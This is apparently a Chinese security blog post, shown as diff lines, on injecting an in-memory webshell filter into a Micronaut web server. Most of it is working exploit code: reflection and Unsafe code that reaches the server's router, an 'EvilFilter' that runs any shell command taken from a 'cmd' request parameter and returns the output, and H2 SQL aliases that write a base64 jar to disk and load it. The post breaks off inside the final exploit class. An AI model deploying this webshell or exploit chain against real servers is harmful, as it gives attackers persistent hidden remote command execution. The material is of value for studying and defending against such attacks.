+<p>在findFilters方法中主要是通过条件进行筛选出匹配当前request对象的filter，其中线判断特殊filter是否为空，如果为空的话则直接从通用filter <code>alwaysMatchesHttpFilters</code> 属性中获取全部的值return，在<code>alwaysMatchesHttpFilters.get()</code> 打上断点，重新请求分析</p>
+<figure data-type="image" tabindex="18"><img src="https://p.ipic.vip/zdfsiu.png" alt="" loading="lazy"></figure>
+<p>always获取的结果是一个arraylist数组，其中包含了三个filter，两个MethodFilter，一个我们自己定义的AroundLegacyFilter</p>
+<figure data-type="image" tabindex="19"><img src="https://p.ipic.vip/u2oxsb.png" alt="" loading="lazy"></figure>
+<p>AroundLegacyFilter存在两个属性，第一个bean属性中保存的是我们自己定义的filter，第二个属性定义的是当前filter过滤器的优先值。</p>
+<p>梳理一下当前我们所分析得到的信息</p>
+<ul>
+<li>filter都是保存在DefaultRouter类中的alwaysMatchesHttpFilers属性中</li>
+<li>自定义filter类型为AroundLegacyFilter
+<ul>
+<li>bean属性为filter</li>
+<li>order为优先级</li>
+</ul>
+</li>
+</ul>
+<h3 id="注入filter内存马">注入filter内存马</h3>
+<p>还是一样需要获取上下文再进行注入，前文中通过object-seacher获取到了rquest对象，这里在尝试获取DefaultRouter类的对象</p>
+<pre><code class="language-java">//设置搜索类型包含Request关键字的对象
+List&lt;Keyword&gt; keys = new ArrayList&lt;&gt;();
+//keys.add(new Keyword.Builder().setField_type(&quot;context&quot;).build());
+keys.add(new Keyword.Builder().setField_type(&quot;defaultRouter&quot;).build());
+//定义黑名单
+List&lt;Blacklist&gt; blacklists = new ArrayList&lt;&gt;();
+blacklists.add(new Blacklist.Builder().setField_type(&quot;java.io.File&quot;).build());
+//新建一个广度优先搜索Thread.currentThread()的搜索器
+SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(),keys);
+// 设置黑名单
+searcher.setBlacklists(blacklists);
+//打开调试模式,会生成log日志
+searcher.setIs_debug(true);
+//挖掘深度为20
+searcher.setMax_search_depth(20);
+//设置报告保存位置
+searcher.setReport_save_path(&quot;/tmp/find2/&quot;);
+searcher.searchObject();
+</code></pre>
+<p>分析结果如下</p>
+<pre><code class="language-java">TargetObject = {io.micronaut.http.netty.channel.NettyThreadFactory$NonBlockingFastThreadLocalThread}
+  ---&gt; threadLocalMap = {io.netty.util.internal.InternalThreadLocalMap}
+   ---&gt; indexedVariables = {class [Ljava.lang.Object;}
+    ---&gt; [10] = {io.micronaut.core.propagation.PropagatedContextImpl}
+     ---&gt; elements = {class [Lio.micronaut.core.propagation.PropagatedContextElement;}
+      ---&gt; [0] = {io.micronaut.http.context.ServerHttpRequestContext}
+       ---&gt; httpRequest = {io.micronaut.http.server.netty.NettyHttpRequest}
+        ---&gt; channelHandlerContext = {io.netty.channel.DefaultChannelHandlerContext}
+         ---&gt; handler = {io.micronaut.http.server.netty.handler.PipeliningServerHandler}
+          ---&gt; requestHandler = {io.micronaut.http.server.netty.RoutingInBoundHandler}
+           ---&gt; routeExecutor = {io.micronaut.http.server.RouteExecutor}
+            ---&gt; router = {io.micronaut.web.router.DefaultRouter}
+</code></pre>
+<p>编写代码尝试获取</p>
+<pre><code class="language-java">try {
+    // 获取Unsafe实例
+    Field unsafeField = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);
+    unsafeField.setAccessible(true);
+    Unsafe unsafe = (Unsafe) unsafeField.get(null);
+
+    // 获取当前线程 (假设线程类型是NettyThreadFactory$NonBlockingFastThreadLocalThread)
+    Thread currentThread = Thread.currentThread();
+
+    // 检查是否是Netty的线程类型
+    if (currentThread.getClass().getName().contains(&quot;NettyThreadFactory$NonBlockingFastThreadLocalThread&quot;)) {
+        // 获取threadLocalMap字段的偏移量
+        Field threadLocalMapField = currentThread.getClass().getSuperclass().getDeclaredField(&quot;threadLocalMap&quot;);
+        long threadLocalMapOffset = unsafe.objectFieldOffset(threadLocalMapField);
+
+        // 使用Unsafe获取threadLocalMap字段的值
+        InternalThreadLocalMap threadLocalMap = (InternalThreadLocalMap) unsafe.getObject(currentThread, threadLocalMapOffset);
+
+        // 获取threadLocalMap中的indexedVariables
+        Field indexedVariablesField = InternalThreadLocalMap.class.getDeclaredField(&quot;indexedVariables&quot;);
+        indexedVariablesField.setAccessible(true);
+        Object[] indexedVariables = (Object[]) indexedVariablesField.get(threadLocalMap);
+
+        // 获取索引为10的变量
+        Object indexedVariable = indexedVariables[10];
+
+        // 确认indexedVariable是PropagatedContextImpl类型
+        if (indexedVariable != null &amp;&amp; indexedVariable.getClass().getName().contains(&quot;PropagatedContextImpl&quot;)) {
+            // 获取PropagatedContextImpl的elements属性
+            Field elementsField = indexedVariable.getClass().getDeclaredField(&quot;elements&quot;);
+            elementsField.setAccessible(true);
+            PropagatedContextElement[] elements = (PropagatedContextElement[]) elementsField.get(indexedVariable);
+
+            PropagatedContextElement element = elements[0];
+
+            // 反射获取element的httpRequest属性
+            if (element != null &amp;&amp; element.getClass().getName().contains(&quot;ServerHttpRequestContext&quot;)) {
+                // 获取ServerHttpRequestContext类中的httpRequest字段
+                Field httpRequestField = element.getClass().getDeclaredField(&quot;httpRequest&quot;);
+                httpRequestField.setAccessible(true);
+                NettyHttpRequest httpRequest = (NettyHttpRequest) httpRequestField.get(element);
+
+                // 获取channelHandlerContext属性
+                Field channelHandlerContextField = NettyHttpRequest.class.getDeclaredField(&quot;channelHandlerContext&quot;);
+                channelHandlerContextField.setAccessible(true);
+                Object channelHandlerContext = channelHandlerContextField.get(httpRequest);
+
+                // 获取handler属性
+                Field handlerField = channelHandlerContext.getClass().getDeclaredField(&quot;handler&quot;);
+                handlerField.setAccessible(true);
+                Object handler = handlerField.get(channelHandlerContext);
+
+                // 获取requestHandler属性
+                Field requestHandlerField = handler.getClass().getDeclaredField(&quot;requestHandler&quot;);
+                requestHandlerField.setAccessible(true);
+                Object requestHandler = requestHandlerField.get(handler);
+
+                // 获取routeExecutor属性
+                Field routeExecutorField = requestHandler.getClass().getDeclaredField(&quot;routeExecutor&quot;);
+                routeExecutorField.setAccessible(true);
+                RouteExecutor routeExecutor = (RouteExecutor) routeExecutorField.get(requestHandler);
+
+                // 获取router属性
+                Field routerField = routeExecutor.getClass().getDeclaredField(&quot;router&quot;);
+                routerField.setAccessible(true);
+                DefaultRouter router = (DefaultRouter) routerField.get(routeExecutor);
+
+            } else {
+                System.out.println(&quot;element不是ServerHttpRequestContext类型。&quot;);
+            }
+        } else {
+            System.out.println(&quot;Indexed variable is not of type PropagatedContextImpl.&quot;);
+        }
+
+    } else {
+        System.out.println(&quot;当前线程不是Netty的线程类型。&quot;);
+    }
+
+} catch (Exception e) {
+    e.printStackTrace();
+}
+</code></pre>
+<p>成功拿到DefaultRouter对象，其中就存在我们需要的alwaysMatchesHttpFilers属性</p>
+<figure data-type="image" tabindex="20"><img src="https://p.ipic.vip/45vbid.png" alt="" loading="lazy"></figure>
+<p>接下来需要编写代码创建一个新的AroundLegacyFilter再将其添加到alwaysMatchesHttpFilers.value中</p>
+<figure data-type="image" tabindex="21"><img src="https://p.ipic.vip/g5p1zh.png" alt="" loading="lazy"></figure>
+<p>AroundLegacyFilter类没有public修饰符，构造方法有两个参数，第一个为HttpFilter类型的bean，第二个为FilterOrder类型的order。</p>
+<p>先构造一个自定义HttpFiler，在一开始调试时候构造的filter实现的接口类HttpServerFilter继承了HttpFilter，所以实现一个恶意filter也只需要new一个HttpServerFilter的实例并实现对应的方法即可，这里直接给出代码</p>
+<pre><code class="language-java">// 创建HttpFilter实例
+HttpServerFilter hackedFilter = new HttpServerFilter() {
+    @Override
+    public Publisher&lt;MutableHttpResponse&lt;?&gt;&gt; doFilter(HttpRequest&lt;?&gt; request, ServerFilterChain chain) {
+        String cmd = request.getParameters().get(&quot;cmd&quot;);
+        String output = &quot;&quot;;
+        try {
+            boolean isLinux = true;
+            String osTyp = System.getProperty(&quot;os.name&quot;);
+            if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) {
+                isLinux = false;
+            }
+            String[] cmds = isLinux ? new String[]{&quot;sh&quot;, &quot;-c&quot;, cmd} : new String[]{&quot;cmd.exe&quot;, &quot;/c&quot;, cmd};
+            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
+            Scanner s = new Scanner(in).useDelimiter(&quot;\\A&quot;);
+            output = s.hasNext() ? s.next() : &quot;&quot;;
+        } catch (IOException ioe) {
+            ioe.printStackTrace();
+        }
+
+        String finalOutput = output;
+        String sanitizedOutput = finalOutput.replaceAll(&quot;[\\r\\n]&quot;, &quot;&quot;);
+        return Flux.from(chain.proceed(request))
+                .doOnNext(response -&gt; {
+										// response.getHeaders().add(&quot;X-Trace-Enabled&quot;, sanitizedOutput);
+                    response.body(finalOutput);
+                });
+    }
+};
+</code></pre>
+<p>再构造FilterOrder类</p>
+<figure data-type="image" tabindex="22"><img src="https://p.ipic.vip/ntfky6.png" alt="" loading="lazy"></figure>
+<p>FilterOrder接口有两个内部实现类，选择其中一个实例化再设置优先级即可，优先级数值越小优先级越高</p>
+<pre><code class="language-java">// 创建一个Dynamic FilterOrder实例，回退排序值为0
+FilterOrder dynamicOrder = new FilterOrder.Dynamic(0);
+</code></pre>
+<p>再往下构造AroundLegacyFilter实例，AroundLegacyFilter类没有public修饰符，需要使用反射进行实例化</p>
+<pre><code class="language-java">// 获取AroundLegacyFilter类
+Class&lt;?&gt; aroundLegacyFilterClass = Class.forName(&quot;io.micronaut.http.filter.AroundLegacyFilter&quot;);
+
+// 使用Unsafe分配AroundLegacyFilter的实例
+Object legacyFilter = unsafe.allocateInstance(aroundLegacyFilterClass);
+
+// 获取AroundLegacyFilter的构造函数
+Constructor&lt;?&gt; constructor = aroundLegacyFilterClass.getDeclaredConstructor(HttpFilter.class, FilterOrder.class);
+constructor.setAccessible(true);  // 允许访问私有构造方法
+
+// 创建HttpFilter实例
+HttpServerFilter hackedFilter = new HttpServerFilter() {
+    @Override
+    public Publisher&lt;MutableHttpResponse&lt;?&gt;&gt; doFilter(HttpRequest&lt;?&gt; request, ServerFilterChain chain) {
+        String cmd = request.getParameters().get(&quot;cmd&quot;);
+        String output = &quot;&quot;;
+        try {
+            boolean isLinux = true;
+            String osTyp = System.getProperty(&quot;os.name&quot;);
+            if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) {
+                isLinux = false;
+            }
+            String[] cmds = isLinux ? new String[]{&quot;sh&quot;, &quot;-c&quot;, cmd} : new String[]{&quot;cmd.exe&quot;, &quot;/c&quot;, cmd};
+            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
+            Scanner s = new Scanner(in).useDelimiter(&quot;\\A&quot;);
+            output = s.hasNext() ? s.next() : &quot;&quot;;
+        } catch (IOException ioe) {
+            ioe.printStackTrace();
+        }
+
+
+        String finalOutput = output;
+        String sanitizedOutput = finalOutput.replaceAll(&quot;[\\r\\n]&quot;, &quot;&quot;);
+        return Flux.from(chain.proceed(request))
+                .doOnNext(response -&gt; {
+//                                            response.getHeaders().add(&quot;X-Trace-Enabled&quot;, sanitizedOutput);
+                    response.body(finalOutput);
+                });
+    }
+};
+
+// 创建一个Dynamic FilterOrder实例，回退排序值为0
+FilterOrder dynamicOrder = new FilterOrder.Dynamic(0);
+
+// 调用构造函数初始化实例
+Object aroundLegacyFilter = constructor.newInstance(hackedFilter, dynamicOrder);
+</code></pre>
+<p>再从DefaultRouter实例中获取alwaysMatchesHttpFilers属性，将新的AroundLegacyFilter实例添加到其中，再反射修改回DefaultRouter对象，最终代码如下：</p>
+<pre><code class="language-java">package hello.micronaut.config;
+
+import io.micronaut.core.propagation.PropagatedContextElement;
+import io.micronaut.core.util.SupplierUtil;
+import io.micronaut.http.HttpRequest;
+import io.micronaut.http.MutableHttpResponse;
+import io.micronaut.http.filter.*;
+import io.micronaut.http.server.RouteExecutor;
+import io.micronaut.http.server.netty.NettyHttpRequest;
+import io.micronaut.web.router.DefaultRouter;
+import io.netty.util.internal.InternalThreadLocalMap;
+import org.reactivestreams.Publisher;
+import sun.misc.Unsafe;
+
+import java.io.IOException;
+import java.io.InputStream;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.util.ArrayList;
+import java.util.Scanner;
+import java.util.function.Supplier;
+
+import reactor.core.publisher.Flux;
+
+
+public class EvilFilter {
+
+    static {
+        try {
+            // 获取Unsafe实例
+            Field unsafeField = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);
+            unsafeField.setAccessible(true);
+            Unsafe unsafe = (Unsafe) unsafeField.get(null);
+
+            // 获取当前线程 (假设线程类型是NettyThreadFactory$NonBlockingFastThreadLocalThread)
+            Thread currentThread = Thread.currentThread();
+
+            // 检查是否是Netty的线程类型
+            if (currentThread.getClass().getName().contains(&quot;NettyThreadFactory$NonBlockingFastThreadLocalThread&quot;)) {
+                // 获取threadLocalMap字段的偏移量
+                Field threadLocalMapField = currentThread.getClass().getSuperclass().getDeclaredField(&quot;threadLocalMap&quot;);
+                long threadLocalMapOffset = unsafe.objectFieldOffset(threadLocalMapField);
+
+                // 使用Unsafe获取threadLocalMap字段的值
+                InternalThreadLocalMap threadLocalMap = (InternalThreadLocalMap) unsafe.getObject(currentThread, threadLocalMapOffset);
+
+                // 获取threadLocalMap中的indexedVariables
+                Field indexedVariablesField = InternalThreadLocalMap.class.getDeclaredField(&quot;indexedVariables&quot;);
+                indexedVariablesField.setAccessible(true);
+                Object[] indexedVariables = (Object[]) indexedVariablesField.get(threadLocalMap);
+
+                // 获取索引为10的变量
+                Object indexedVariable = indexedVariables[10];
+
+                // 确认indexedVariable是PropagatedContextImpl类型
+                if (indexedVariable != null &amp;&amp; indexedVariable.getClass().getName().contains(&quot;PropagatedContextImpl&quot;)) {
+                    // 获取PropagatedContextImpl的elements属性
+                    Field elementsField = indexedVariable.getClass().getDeclaredField(&quot;elements&quot;);
+                    elementsField.setAccessible(true);
+                    PropagatedContextElement[] elements = (PropagatedContextElement[]) elementsField.get(indexedVariable);
+
+                    PropagatedContextElement element = elements[0];
+
+                    // 反射获取element的httpRequest属性
+                    if (element != null &amp;&amp; element.getClass().getName().contains(&quot;ServerHttpRequestContext&quot;)) {
+                        // 获取ServerHttpRequestContext类中的httpRequest字段
+                        Field httpRequestField = element.getClass().getDeclaredField(&quot;httpRequest&quot;);
+                        httpRequestField.setAccessible(true);
+                        NettyHttpRequest httpRequest = (NettyHttpRequest) httpRequestField.get(element);
+
+                        // 获取channelHandlerContext属性
+                        Field channelHandlerContextField = NettyHttpRequest.class.getDeclaredField(&quot;channelHandlerContext&quot;);
+                        channelHandlerContextField.setAccessible(true);
+                        Object channelHandlerContext = channelHandlerContextField.get(httpRequest);
+
+                        // 获取handler属性
+                        Field handlerField = channelHandlerContext.getClass().getDeclaredField(&quot;handler&quot;);
+                        handlerField.setAccessible(true);
+                        Object handler = handlerField.get(channelHandlerContext);
+
+                        // 获取requestHandler属性
+                        Field requestHandlerField = handler.getClass().getDeclaredField(&quot;requestHandler&quot;);
+                        requestHandlerField.setAccessible(true);
+                        Object requestHandler = requestHandlerField.get(handler);
+
+                        // 获取routeExecutor属性
+                        Field routeExecutorField = requestHandler.getClass().getDeclaredField(&quot;routeExecutor&quot;);
+                        routeExecutorField.setAccessible(true);
+                        RouteExecutor routeExecutor = (RouteExecutor) routeExecutorField.get(requestHandler);
+
+                        // 获取router属性
+                        Field routerField = routeExecutor.getClass().getDeclaredField(&quot;router&quot;);
+                        routerField.setAccessible(true);
+                        DefaultRouter router = (DefaultRouter) routerField.get(routeExecutor);
+
+
+                        // 获取alwaysMatchesHttpFilters属性
+                        Field alwaysMatchesHttpFiltersField = router.getClass().getDeclaredField(&quot;alwaysMatchesHttpFilters&quot;);
+                        alwaysMatchesHttpFiltersField.setAccessible(true);
+                        Supplier&lt;ArrayList&lt;GenericHttpFilter&gt;&gt; alwaysMatchesHttpFilters =
+                                (Supplier&lt;ArrayList&lt;GenericHttpFilter&gt;&gt;) unsafe.getObject(router,
+                                        unsafe.objectFieldOffset(alwaysMatchesHttpFiltersField));
+
+                        // 这里可以使用alwaysMatchesHttpFilters进行其他操作
+                        ArrayList&lt;GenericHttpFilter&gt; filters = alwaysMatchesHttpFilters.get();
+
+                        // ================== ================== ================== ==================
+                        // 获取AroundLegacyFilter类
+                        Class&lt;?&gt; aroundLegacyFilterClass = Class.forName(&quot;io.micronaut.http.filter.AroundLegacyFilter&quot;);
+
+                        // 使用Unsafe分配AroundLegacyFilter的实例
+                        Object legacyFilter = unsafe.allocateInstance(aroundLegacyFilterClass);
+
+                        // 获取AroundLegacyFilter的构造函数
+                        Constructor&lt;?&gt; constructor = aroundLegacyFilterClass.getDeclaredConstructor(HttpFilter.class, FilterOrder.class);
+                        constructor.setAccessible(true);  // 允许访问私有构造方法
+
+                        // 创建HttpFilter实例
+                        HttpServerFilter hackedFilter = new HttpServerFilter() {
+                            @Override
+                            public Publisher&lt;MutableHttpResponse&lt;?&gt;&gt; doFilter(HttpRequest&lt;?&gt; request, ServerFilterChain chain) {
+                                String cmd = request.getParameters().get(&quot;cmd&quot;);
+                                String output = &quot;&quot;;
+                                try {
+                                    boolean isLinux = true;
+                                    String osTyp = System.getProperty(&quot;os.name&quot;);
+                                    if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) {
+                                        isLinux = false;
+                                    }
+                                    String[] cmds = isLinux ? new String[]{&quot;sh&quot;, &quot;-c&quot;, cmd} : new String[]{&quot;cmd.exe&quot;, &quot;/c&quot;, cmd};
+                                    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
+                                    Scanner s = new Scanner(in).useDelimiter(&quot;\\A&quot;);
+                                    output = s.hasNext() ? s.next() : &quot;&quot;;
+                                } catch (IOException ioe) {
+                                    ioe.printStackTrace();
+                                }
+
+
+                                String finalOutput = output;
+                                String sanitizedOutput = finalOutput.replaceAll(&quot;[\\r\\n]&quot;, &quot;&quot;);
+                                return Flux.from(chain.proceed(request))
+                                        .doOnNext(response -&gt; {
+//                                            response.getHeaders().add(&quot;X-Trace-Enabled&quot;, sanitizedOutput);
+                                            response.body(finalOutput);
+                                        });
+                            }
+                        };
+
+                        // 创建一个Dynamic FilterOrder实例，回退排序值为0
+                        FilterOrder dynamicOrder = new FilterOrder.Dynamic(0);
+
+                        // 调用构造函数初始化实例
+                        Object aroundLegacyFilter = constructor.newInstance(hackedFilter, dynamicOrder);
+
+                        // 将新的filter添加到filters列表中
+                        filters.add((GenericHttpFilter) aroundLegacyFilter);
+
+                        // 更新alwaysMatchesHttpFilters
+                        unsafe.putObject(router, unsafe.objectFieldOffset(alwaysMatchesHttpFiltersField),
+                                SupplierUtil.memoized(() -&gt; filters));
+
+                    } else {
+                        System.out.println(&quot;element不是ServerHttpRequestContext类型。&quot;);
+                    }
+                } else {
+                    System.out.println(&quot;Indexed variable is not of type PropagatedContextImpl.&quot;);
+                }
+
+            } else {
+                System.out.println(&quot;当前线程不是Netty的线程类型。&quot;);
+            }
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+
+    }
+
+}
+</code></pre>
+<h3 id="效果展示">效果展示</h3>
+<p>演示就简单的实例化这个EvilFiter类，注入成功后请求一个不存在的接口添加cmd参数都可以拿到执行命令结果</p>
+<figure data-type="image" tabindex="23"><img src="https://p.ipic.vip/gygjnd.png" alt="" loading="lazy"></figure>
+<h2 id="0x05-h2-任意代码执行注入micronaut内存马">0x05 h2 任意代码执行注入micronaut内存马</h2>
+<p>两种思路，第一种是直接将注入内存马的代码按照h2 sql的语法进行编码转换执行，但是比较麻烦，需要将import的类都写成全类名进行使用。</p>
+<p>第二种将jar包读取为二进制流再base64写到服务器，再使用loadClas加载即可</p>
+<pre><code class="language-java">-- Step 1: 创建Base64解码和文件写入的ALIAS
+CREATE ALIAS IF NOT EXISTS BASE64_TO_JAR AS '
+void base64ToJar(String base64Data, String filePath) throws java.io.IOException {
+    byte[] jarBytes = java.util.Base64.getDecoder().decode(base64Data);
+    try (java.io.FileOutputStream fos = new java.io.FileOutputStream(filePath)) {
+        fos.write(jarBytes);
+    }
+}
+';
+
+-- Step 2: 创建加载JAR并执行方法的ALIAS
+CREATE ALIAS IF NOT EXISTS LOAD_JAR AS '
+void loadJar(String jarPath, String className, String methodName) throws Exception {
+    java.net.URL jarUrl = new java.net.URL(&quot;file:&quot; + jarPath);
+    java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{jarUrl});
+    Class&lt;?&gt; loadedClass = classLoader.loadClass(className);
+    Object instance = loadedClass.getDeclaredConstructor().newInstance();
+    java.lang.reflect.Method method = loadedClass.getMethod(methodName);
+    method.invoke(instance);
+}
+';
+
+-- Step 3: 执行Base64解码并写入JAR文件
+CALL BASE64_TO_JAR('你的base64数据', 'yourfile.jar');
+
+-- Step 4: 加载JAR并执行方法
+CALL LOAD_JAR('yourfile.jar', 'com.example.YourClass', 'executeMethod');
+</code></pre>
+<p>按照完整流程来进行利用，将创建一个新的项目，将内存马写入一个类中，编译为jar包转为base64。</p>
+<h2 id="0x06-最终exp">0x06 最终exp</h2>
+<p>编写exp需要注意反引号可能回导致问题</p>
+<p>evilFilter</p>
+<pre><code class="language-java">package micronaut.poc;
+
+import io.micronaut.core.propagation.PropagatedContextElement;
+import io.micronaut.core.util.SupplierUtil;
+import io.micronaut.http.HttpRequest;
+import io.micronaut.http.MutableHttpResponse;
+import io.micronaut.http.filter.*;
+import io.micronaut.http.server.RouteExecutor;
+import io.micronaut.http.server.netty.NettyHttpRequest;
+import io.micronaut.web.router.DefaultRouter;
+import io.netty.util.internal.InternalThreadLocalMap;
+import org.reactivestreams.Publisher;
+import reactor.core.publisher.Flux;
+import sun.misc.Unsafe;
+
+import java.io.IOException;
+import java.io.InputStream;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.util.ArrayList;
+import java.util.Scanner;
+import java.util.function.Supplier;
+
+
+public class EvilFilter {
+
+    public void hacked() {
+        try {
+            // 获取Unsafe实例
+            Field unsafeField = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);
+            unsafeField.setAccessible(true);
+            Unsafe unsafe = (Unsafe) unsafeField.get(null);
+
+            // 获取当前线程 (假设线程类型是NettyThreadFactory$NonBlockingFastThreadLocalThread)
+            Thread currentThread = Thread.currentThread();
+
+            // 检查是否是Netty的线程类型
+            if (currentThread.getClass().getName().contains(&quot;NettyThreadFactory$NonBlockingFastThreadLocalThread&quot;)) {
+                // 获取threadLocalMap字段的偏移量
+                Field threadLocalMapField = currentThread.getClass().getSuperclass().getDeclaredField(&quot;threadLocalMap&quot;);
+                long threadLocalMapOffset = unsafe.objectFieldOffset(threadLocalMapField);
+
+                // 使用Unsafe获取threadLocalMap字段的值
+                InternalThreadLocalMap threadLocalMap = (InternalThreadLocalMap) unsafe.getObject(currentThread, threadLocalMapOffset);
+
+                // 获取threadLocalMap中的indexedVariables
+                Field indexedVariablesField = InternalThreadLocalMap.class.getDeclaredField(&quot;indexedVariables&quot;);
+                indexedVariablesField.setAccessible(true);
+                Object[] indexedVariables = (Object[]) indexedVariablesField.get(threadLocalMap);
+
+                Object indexedVariable = null;
+
+                // 遍历indexedVariables数组，寻找PropagatedContextImpl类型的变量
+                for (Object variable : indexedVariables) {
+                    System.out.println(variable.getClass().getName());
+                    if (variable.getClass().getName().contains(&quot;PropagatedContextImpl&quot;)) {
+                        indexedVariable = variable;
+                        break;
+                    }
+                }
+
+                // 如果找到了PropagatedContextImpl类型的变量
+                if (indexedVariable != null) {
+                    // 获取PropagatedContextImpl的elements属性
+                    Field elementsField = indexedVariable.getClass().getDeclaredField(&quot;elements&quot;);
+                    elementsField.setAccessible(true);
+                    PropagatedContextElement[] elements = (PropagatedContextElement[]) elementsField.get(indexedVariable);
+
+                    PropagatedContextElement element = elements[0];
+
+                    // 反射获取element的httpRequest属性
+                    if (element != null &amp;&amp; element.getClass().getName().contains(&quot;ServerHttpRequestContext&quot;)) {
+                        // 获取ServerHttpRequestContext类中的httpRequest字段
+                        Field httpRequestField = element.getClass().getDeclaredField(&quot;httpRequest&quot;);
+                        httpRequestField.setAccessible(true);
+                        NettyHttpRequest httpRequest = (NettyHttpRequest) httpRequestField.get(element);
+
+                        // 获取channelHandlerContext属性
+                        Field channelHandlerContextField = NettyHttpRequest.class.getDeclaredField(&quot;channelHandlerContext&quot;);
+                        channelHandlerContextField.setAccessible(true);
+                        Object channelHandlerContext = channelHandlerContextField.get(httpRequest);
+
+                        // 获取handler属性
+                        Field handlerField = channelHandlerContext.getClass().getDeclaredField(&quot;handler&quot;);
+                        handlerField.setAccessible(true);
+                        Object handler = handlerField.get(channelHandlerContext);
+
+                        // 获取requestHandler属性
+                        Field requestHandlerField = handler.getClass().getDeclaredField(&quot;requestHandler&quot;);
+                        requestHandlerField.setAccessible(true);
+                        Object requestHandler = requestHandlerField.get(handler);
+
+                        // 获取routeExecutor属性
+                        Field routeExecutorField = requestHandler.getClass().getDeclaredField(&quot;routeExecutor&quot;);
+                        routeExecutorField.setAccessible(true);
+                        RouteExecutor routeExecutor = (RouteExecutor) routeExecutorField.get(requestHandler);
+
+                        // 获取router属性
+                        Field routerField = routeExecutor.getClass().getDeclaredField(&quot;router&quot;);
+                        routerField.setAccessible(true);
+                        DefaultRouter router = (DefaultRouter) routerField.get(routeExecutor);
+
+                        // 获取alwaysMatchesHttpFilters属性
+                        Field alwaysMatchesHttpFiltersField = router.getClass().getDeclaredField(&quot;alwaysMatchesHttpFilters&quot;);
+                        alwaysMatchesHttpFiltersField.setAccessible(true);
+                        Supplier&lt;ArrayList&lt;GenericHttpFilter&gt;&gt; alwaysMatchesHttpFilters =
+                                (Supplier&lt;ArrayList&lt;GenericHttpFilter&gt;&gt;) unsafe.getObject(router,
+                                        unsafe.objectFieldOffset(alwaysMatchesHttpFiltersField));
+
+                        // 获取现有的过滤器列表
+                        ArrayList&lt;GenericHttpFilter&gt; filters = alwaysMatchesHttpFilters.get();
+
+                        // 创建新的过滤器
+                        HttpServerFilter hackedFilter = new HttpServerFilter() {
+                            @Override
+                            public Publisher&lt;MutableHttpResponse&lt;?&gt;&gt; doFilter(HttpRequest&lt;?&gt; request, ServerFilterChain chain) {
+                                String cmd = request.getParameters().get(&quot;cmd&quot;);
+                                String output = &quot;&quot;;
+                                try {
+                                    boolean isLinux = true;
+                                    String osTyp = System.getProperty(&quot;os.name&quot;);
+                                    if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) {
+                                        isLinux = false;
+                                    }
+                                    String[] cmds = isLinux ? new String[]{&quot;sh&quot;, &quot;-c&quot;, cmd} : new String[]{&quot;cmd.exe&quot;, &quot;/c&quot;, cmd};
+                                    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
+                                    Scanner s = new Scanner(in).useDelimiter(&quot;\\A&quot;);
+                                    output = s.hasNext() ? s.next() : &quot;&quot;;
+                                } catch (IOException ioe) {
+                                    ioe.printStackTrace();
+                                }
+
+                                String finalOutput = output;
+                                return Flux.from(chain.proceed(request))
+                                        .doOnNext(response -&gt; {
+                                            response.body(finalOutput);
+                                        });
+                            }
+                        };
+
+                        // 获取AroundLegacyFilter类
+                        Class&lt;?&gt; aroundLegacyFilterClass = Class.forName(&quot;io.micronaut.http.filter.AroundLegacyFilter&quot;);
+
+                        // 使用Unsafe分配AroundLegacyFilter的实例
+                        Object legacyFilter = unsafe.allocateInstance(aroundLegacyFilterClass);
+
+                        // 获取AroundLegacyFilter的构造函数
+                        Constructor&lt;?&gt; constructor = aroundLegacyFilterClass.getDeclaredConstructor(HttpFilter.class, FilterOrder.class);
+                        constructor.setAccessible(true);  // 允许访问私有构造方法
+
+                        // 创建一个Dynamic FilterOrder实例，回退排序值为0
+                        FilterOrder dynamicOrder = new FilterOrder.Dynamic(0);
+
+                        // 调用构造函数初始化实例
+                        Object aroundLegacyFilter = constructor.newInstance(hackedFilter, dynamicOrder);
+
+                        // 将新的filter添加到filters列表中
+                        filters.add((GenericHttpFilter) aroundLegacyFilter);
+
+                        // 更新alwaysMatchesHttpFilters
+                        unsafe.putObject(router, unsafe.objectFieldOffset(alwaysMatchesHttpFiltersField),
+                                SupplierUtil.memoized(() -&gt; filters));
+
+                    } else {
+                        System.out.println(&quot;element不是ServerHttpRequestContext类型。&quot;);
+                    }
+                } else {
+                    System.out.println(&quot;未找到类型为PropagatedContextImpl的变量。&quot;);
+                }
+
+            } else {
+                System.out.println(&quot;当前线程不是Netty的线程类型。&quot;);
+            }
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+
+}
+
+</code></pre>
+<p>Exp</p>
+<pre><code class="language-java">package hello.micronaut;
+
+import com.fasterxml.jackson.core.JsonProcessingException;
+import com.fasterxml.jackson.databind.ObjectMapper;
+import com.google.gson.Gson;
+import com.google.gson.GsonBuilder;
+import hello.micronaut.bean.User;
+import hello.micronaut.utils.BeanUtil;
+import io.micronaut.http.HttpRequest;
+import io.micronaut.http.HttpResponse;
+import io.micronaut.http.MediaType;
+import io.micronaut.http.client.HttpClient;
+
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.IOException;
+import java.net.URL;
+import java.util.Base64;
+
+public class Exp {
+    public static void main(String[] args) throws Exception {
+
+//        String loadClassName = &quot;micronaut.poc.TestPoc&quot;;
+        String loadClassName = &quot;micronaut.poc.EvilFilter&quot;;
+        String loadClassPath = &quot;/tmp/b.jar&quot;;
+//        String loadClassMethodName = &quot;poc&quot;;
+        String loadClassMethodName = &quot;hacked&quot;;
